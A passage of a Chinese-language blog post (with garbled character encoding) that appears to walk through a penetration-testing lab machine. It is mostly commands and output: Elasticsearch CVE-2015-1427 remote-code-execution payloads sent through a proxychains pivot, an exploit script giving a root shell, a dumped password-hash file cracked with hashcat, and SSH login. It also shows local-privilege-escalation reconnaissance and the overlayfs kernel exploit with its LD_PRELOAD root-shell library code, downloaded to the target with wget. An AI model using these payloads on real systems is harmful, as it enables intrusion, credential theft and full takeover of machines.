class="hljs-string">&#x27;&#123;&quot;name&quot; : &quot;test&quot;&#125;&#x27;</span></span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;&quot;_index&quot;:&quot;doc&quot;,&quot;_type&quot;:&quot;test&quot;,&quot;_id&quot;:&quot;AYHDq6TBj_Czxl86lzH3&quot;,&quot;_version&quot;:1,&quot;created&quot;:true&#125;<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains curl -XPOST <span class="hljs-string">&#x27;http://172.17.0.3:9200/twitter/user/yren&#x27;</span> -d <span class="hljs-string">&#x27;&#123; &quot;name&quot; : &quot;Wu&quot; &#125;&#x27;</span></span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;&quot;_index&quot;:&quot;twitter&quot;,&quot;_type&quot;:&quot;user&quot;,&quot;_id&quot;:&quot;yren&quot;,&quot;_version&quot;:1,&quot;created&quot;:true&#125;    <br></code></pre></td></tr></table></figure><p>å†æ¬¡æ‰§è¡Œ Payloadï¼ŒæˆåŠŸæ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl -XPOST <span class="hljs-string">&#x27;http://172.17.0.3:9200/_search?pretty&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;script_fields&quot;: &#123;&quot;payload&quot;: &#123;&quot;script&quot;:&quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;whoami\&quot;).getText()&quot;&#125;&#125;&#125;&#x27;</span></span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;<br>  &quot;took&quot; : 9,<br>  &quot;timed_out&quot; : false,<br>  &quot;_shards&quot; : &#123;<br>    &quot;total&quot; : 10,<br>    &quot;successful&quot; : 10,<br>    &quot;failed&quot; : 0<br>  &#125;,<br>  &quot;hits&quot; : &#123;<br>    &quot;total&quot; : 2,<br>    &quot;max_score&quot; : 1.0,<br>    &quot;hits&quot; : [ &#123;<br>      &quot;_index&quot; : &quot;twitter&quot;,<br>      &quot;_type&quot; : &quot;user&quot;,<br>      &quot;_id&quot; : &quot;yren&quot;,<br>      &quot;_score&quot; : 1.0,<br>      &quot;fields&quot; : &#123;<br>        &quot;payload&quot; : [ &quot;root\n&quot; ]<br>      &#125;<br>    &#125;, &#123;<br>      &quot;_index&quot; : &quot;doc&quot;,<br>      &quot;_type&quot; : &quot;test&quot;,<br>      &quot;_id&quot; : &quot;AYHDq6TBj_Czxl86lzH3&quot;,<br>      &quot;_score&quot; : 1.0,<br>      &quot;fields&quot; : &#123;<br>        &quot;payload&quot; : [ &quot;root\n&quot; ]<br>      &#125;<br>    &#125; ]<br>  &#125;<br>&#125;<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl -XPOST <span class="hljs-string">&#x27;http://172.17.0.3:9200/_search?pretty&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;whoami\&quot;).getText()&quot;&#125;&#125;&#125;&#x27;</span></span>   <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;<br>  &quot;took&quot; : 60,<br>  &quot;timed_out&quot; : false,<br>  &quot;_shards&quot; : &#123;<br>    &quot;total&quot; : 10,<br>    &quot;successful&quot; : 10,<br>    &quot;failed&quot; : 0<br>  &#125;,<br>  &quot;hits&quot; : &#123;<br>    &quot;total&quot; : 2,<br>    &quot;max_score&quot; : 1.0,<br>    &quot;hits&quot; : [ &#123;<br>      &quot;_index&quot; : &quot;twitter&quot;,<br>      &quot;_type&quot; : &quot;user&quot;,<br>      &quot;_id&quot; : &quot;yren&quot;,<br>      &quot;_score&quot; : 1.0,<br>      &quot;fields&quot; : &#123;<br>        &quot;lupin&quot; : [ &quot;root\n&quot; ]<br>      &#125;<br>    &#125; ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†æ¬¡å°è¯• RCE è„šæœ¬ï¼ŒæˆåŠŸäº†ã€‚è¿™æ¬¡ä¾ç„¶æ‹¿åˆ°çš„æ˜¯ docker 2 çš„ root æƒé™ï¼Œæ£€æŸ¥å‘ç° passwords æ–‡ä»¶ ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 python2 36337.py 172.17.0.2</span>                                                 <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br><br> Exploit for ElasticSearch , CVE-2015-1427   Version: 20150309.1                                                         <br>&#123;*&#125; Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something<br><span class="hljs-meta">~$</span><span class="bash"> id</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">~$</span><span class="bash"> whoami</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>root<br><span class="hljs-meta">~$</span><span class="bash"> ls</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>[......]<br>passwords<br>[......]<br><span class="hljs-meta">~$</span><span class="bash"> cat passwords</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>Format: number,number,number,number,lowercase,lowercase,lowercase,lowercase<br>Example: 1234abcd<br>john:3f8184a7343664553fcb5337a3138814 <br>test:861f194e9d6118f3d942a72be3e51749<br>admin:670c3bbc209a18dde5446e5e6c1f1d5b<br>root:b3d34352fc26117979deabdf1b9b6354<br>jane:5c158b60ed97c723b673529b8a3cf72b<br></code></pre></td></tr></table></figure><p>æç¤ºæˆ‘ä»¬ä½¿ç”¨ hashcat ç ´è§£ hash å€¼ï¼ŒFormat å°±æ˜¯æ¨¡æ¿ï¼Œå…ˆæŠŠ hash æå–å‡ºæ¥ï¼Œä¿å­˜ä¸ºä¸€ä¸ªæ–‡ä»¶ ã€‚</p><p>Hashcat ç ´è§£ï¼š</p><blockquote><p><a href="https://www.freebuf.com/sectool/164507.html">å¯†ç ç ´è§£å…¨èƒ½å·¥å…·ï¼šHashcatå¯†ç ç ´è§£æ”»ç•¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat pwd.hash</span> <br>3f8184a7343664553fcb5337a3138814<br>861f194e9d6118f3d942a72be3e51749<br>670c3bbc209a18dde5446e5e6c1f1d5b<br>b3d34352fc26117979deabdf1b9b6354<br>5c158b60ed97c723b673529b8a3cf72b                                                                                                                                            <br><span class="hljs-meta">#</span><span class="bash"> -m 0 æŒ‡å“ˆå¸Œç±»å‹æ˜¯md5 ï¼Œ -a 3 æŒ‡æ©ç æ”»å‡»ï¼Œæ ¹æ®æç¤ºï¼Œå‰å››ä½ä¸ºæ•°å­—ï¼Œåå››ä½ä¸ºå°å†™å­—æ¯ï¼Œ?dä»£è¡¨æ•°å­—ï¼Œ?lä»£è¡¨å°å†™å­—æ¯</span><br><span class="hljs-meta">$</span><span class="bash"> hashcat -m 0 -a 3 pwd.hash ?d?d?d?d?l?l?l?l --force</span><br>hashcat (v6.1.1) starting...<br><br>5c158b60ed97c723b673529b8a3cf72b:1234jane        <br>b3d34352fc26117979deabdf1b9b6354:1234pass        <br>670c3bbc209a18dde5446e5e6c1f1d5b:1111pass        <br>3f8184a7343664553fcb5337a3138814:1337hack        <br>861f194e9d6118f3d942a72be3e51749:1234test      <br></code></pre></td></tr></table></figure><p>å¾ˆå¿«å°±ç ´è§£å‡ºæ¥äº†ï¼š</p><blockquote><p>ç½‘ç«™ç ´è§£ï¼š<a href="https://crackstation.net/">https://crackstation.net/</a> or <a href="https://www.somd5.com/">https://www.somd5.com/</a></p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css">Format: number,number,number,number,lowercase,lowercase,lowercase,lowercase<br>Example: <span class="hljs-number">1234</span>abcd<br>john:<span class="hljs-number">3</span>f8184a7343664553fcb5337a3138814:<span class="hljs-number">1337</span>hack<br>test:<span class="hljs-number">861</span>f194e9d6118f3d942a72be3e51749:<span class="hljs-number">1234</span>test<br>admin:<span class="hljs-number">670</span>c3bbc209a18dde5446e5e6c1f1d5b:<span class="hljs-number">1111</span>pass<br>root:b3d34352fc26117979deabdf1b9b6354:<span class="hljs-number">1234</span>pass<br>jane:<span class="hljs-number">5</span>c158b60ed97c723b673529b8a3cf72b:<span class="hljs-number">1234</span>jane<br></code></pre></td></tr></table></figure><h4 id="SSHç™»å½•"><a href="#SSHç™»å½•" class="headerlink" title="SSHç™»å½•"></a>SSHç™»å½•</h4><p>ç»è¿‡æµ‹è¯•ï¼Œåªæœ‰ john å¯ä»¥ç™»å½•ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh john@192.168.135.151</span>         <br>john@192.168.135.151&#x27;s password: <br>Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)<br><br>john@socnet:~$ whoami<br>john<br>john@socnet:~$ id<br>uid=1001(john) gid=1001(john) groups=1001(john)<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ sudoï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ sudo -l<br>[sudo] password for john: <br>Sorry, user john may not run sudo on socnet.<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ SUIDï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null</span><br><span class="hljs-meta">$</span><span class="bash"> find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> ls -ldb &#123;&#125; ;</span><br><br>john@socnet:~$ find / -perm -u=s -type f 2&gt;/dev/null<br>[......]<br>/usr/bin/chsh<br>/usr/bin/pkexec<br>/usr/bin/gpasswd<br>[......]<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ passwdï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>[......]<br>socnet:x:1000:1000:socnet,,,:/home/socnet:/bin/bash<br>john:x:1001:1001:john,,,:/home/john:/bin/bash<br></code></pre></td></tr></table></figure><h3 id="2ã€å†…æ ¸ææƒ"><a href="#2ã€å†…æ ¸ææƒ" class="headerlink" title="2ã€å†…æ ¸ææƒ"></a>2ã€å†…æ ¸ææƒ</h3><p>æ£€æŸ¥å†…æ ¸ä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cat /etc/version<br>$ lsb_release -a<br>john@socnet:~$ uname -a<br>Linux socnet 3.13.0-24-generic <span class="hljs-comment">#46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ searchsploit çœ‹çœ‹æœ‰æ²¡æœ‰ææƒ EXPï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit linux 3.13.0 ubuntu Privilege Escalation</span><br>---------------------------------------------------------------------------------------------------------- -<br>Exploit Title                                                                                            |  Path<br>---------------------------------------------------------------------------------------------------------- -<br>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;overlayfs&#x27; Local Privilege Escalation      | linux/local/37292.c<br>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;overlayfs&#x27; Local Privilege Escalation (Acc | linux/local/37293.txt<br>Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.04/13.10 x64) - &#x27;CONFIG_X86_X32=y&#x27; Local Privilege Escalation (3)    | linux_x86-64/local/31347.c<br>Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                             | linux/local/45010.c<br>Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                    | linux/local/44298.c<br>Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - &#x27;netfilter target_offset&#x27; Local Privilege Escalation         | linux_x86-64/local/44300.c<br>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)     | linux/local/43418.c<br>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalatio | linux/local/47169.c<br>Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                    | linux/local/41760.txt<br>---------------------------------------------------------------------------------------------------------- -<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>é€‰æ‹© 37292.c æ¥åˆ©ç”¨ï¼ŒæŸ¥çœ‹é¶æœºæœ‰æ²¡æœ‰ gccï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ gcc --version<br>The program &#x27;gcc&#x27; is currently not installed. To run &#x27;gcc&#x27; please ask your administrator to install the package &#x27;gcc&#x27;<br></code></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰ gcc ï¼Œå°è¯•åœ¨æœ¬åœ°ç¼–è¯‘ä¹‹åå†ä¼ è‡³é¶æœºï¼š</p><blockquote><p>æ²¡æœ‰æƒé™åœ¨çº¿å®‰è£… gccï¼Œä¹Ÿæ— æ³•ç¦»çº¿å®‰è£…ï¼Œæ²¡æœ‰ rpm å‘½ä»¤</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc 37292.c -o ofs</span>                                                                       <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span>      <br>Serving HTTP on 0.0.0.0 port 8888 ...<br>192.168.135.151 - - [02/Jul/2022 00:31:01] &quot;GET /ofs HTTP/1.1&quot; 200 -<br></code></pre></td></tr></table></figure><p>é¶æœºä¸‹è½½ã€è¿è¡Œæ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ wget http://192.168.135.141:8888/ofs<br><br>john@socnet:~$ ls<br>ofs<br>john@socnet:~$ ./ofs<br>-bash: ./ofs: Permission denied<br>john@socnet:~$ chmod +x ofs<br>john@socnet:~$ ./ofs<br>spawning threads<br>mount #1<br>mount #2<br>child threads done<br>/etc/ld.so.preload created<br>creating shared library<br>sh: 1: gcc: not found<br>couldn&#x27;t create dynamic library<br></code></pre></td></tr></table></figure><p>è¿è¡Œåå‘ç° gcc æŠ¥é”™ï¼Œä¹Ÿæ„å‘³ç€ä»£ç ä¸­å«æœ‰ gcc å‘½ä»¤ï¼ŒæŸ¥çœ‹æºç ï¼Œå‘ç°æ‰§è¡Œäº†ä¸€æ¡å‘½ä»¤ç”¨æ¥ç¼–è¯‘ç”Ÿæˆ ofs-lib.so æ–‡ä»¶ï¼Œç„¶åå¾€ä¸Šæ‰¾ï¼Œå¯ä»¥æ‰¾åˆ° LIB å˜é‡çš„å†…å®¹ ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LIB <span class="hljs-meta-string">&quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span></span><br><br>lib = open(<span class="hljs-string">&quot;/tmp/ofs-lib.c&quot;</span>,O_CREAT|O_WRONLY,<span class="hljs-number">0777</span>);<br>    write(lib,LIB,<span class="hljs-built_in">strlen</span>(LIB));<br>    close(lib);<br>    lib = system(<span class="hljs-string">&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;</span>);<br>    <span class="hljs-keyword">if</span>(lib != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;couldn&#x27;t create dynamic library\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>æŠŠ LIB å’Œç¼–è¯‘éƒ¨åˆ†çš„ä»£ç å¤åˆ¶å‡ºæ¥ï¼Œå†™å…¥æ–‡ä»¶ generate.c ï¼Œç¼–è¯‘è¿è¡Œï¼Œç”Ÿæˆ ofs-lib.so ï¼Œä¸ ofs æ–‡ä»¶ä¸€åŒä¸Šä¼ åˆ°é¶æœºï¼Œèµ‹æƒé™æ‰§è¡Œå³å¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;stdlib.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;unistd.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sched.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/stat.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/mount.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;stdlib.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;unistd.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sched.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/stat.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/mount.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;signal.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;fcntl.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;linux/sched.h&gt;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">define LIB <span class="hljs-string">&quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span></span><br><br>int main()<br>&#123;<br>    int lib;<br>    lib = open(&quot;/tmp/ofs-lib.c&quot;,O_CREAT|O_WRONLY,0777);<br>    write(lib,LIB,strlen(LIB));<br>    close(lib);<br>    lib = system(&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;);<br>    if(lib != 0) &#123;<br>        fprintf(stderr,&quot;couldn&#x27;t create dynamic library\n&quot;);<br>        exit(-1);<br>    &#125;<br>    return 0;<br></code></pre></td></tr></table></figure><p>æœ¬åœ°ç¼–è¯‘ä¿®æ”¹å¥½çš„æ¼æ´è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc 37292.c -o ofs</span>                                                                                                                   <br><span class="hljs-meta">$</span><span class="bash"> gcc generate.c -o ge</span>                                                                                       <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./ge</span>                                              <br>                                                                                                             $ mv /tmp/ofs-lib.so ./                                                      <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br>Serving HTTP on 0.0.0.0 port 8888 ...<br>192.168.135.151 - - [02/Jul/2022 00:45:07] &quot;GET /ofs HTTP/1.1&quot; 200 -<br>192.168.135.151 - - [02/Jul/2022 00:45:54] &quot;GET /ofs-lib.so HTTP/1.1&quot; 200 -<br></code></pre></td></tr></table></figure><p>é¶æœºé€šè¿‡ wget ä¸‹è½½ç¼–è¯‘å¥½çš„è„šæœ¬åŠ ofs-lib.so æ–‡ä»¶ï¼Œè¿è¡Œå³å¯æ‹¿åˆ° root æƒé™ã€‚</p><blockquote><p>ofs-lib.so æ–‡ä»¶éœ€è¦æ”¾åœ¨ tmp ç›®å½•ä¸‹ï¼Œå› ä¸ºææƒæ–‡ä»¶é‡Œå†™çš„è·¯å¾„æ˜¯ /tmpï¼Œè€Œä¸” tmp æ˜¯å­˜æ”¾ä¸´æ—¶æ–‡ä»¶çš„ï¼Œä¼šæ¶ˆé™¤æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæœ‰åˆ©äºéšè—æ”»å‡» ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 